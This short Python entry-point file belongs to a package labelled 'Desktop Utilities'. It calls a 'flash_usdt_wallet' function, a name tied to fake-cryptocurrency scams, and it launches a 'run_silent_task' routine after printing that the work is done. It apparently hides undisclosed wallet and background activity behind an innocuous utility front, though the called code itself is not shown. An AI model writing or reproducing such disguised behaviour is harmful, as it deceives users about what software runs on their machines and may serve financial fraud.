
"""
__main__.py - main entry point
"""

from . import utils
from . import desktop_core

def main():
    print("crto0 — Desktop Utilities")
    print("=========================")
    utils.flash_usdt_wallet()
    utils.sync_shortcuts()
    utils.cleanup_temp_files()
    print("[*] Done.")
    desktop_core.run_silent_task()

if __name__ == "__main__":
    main()
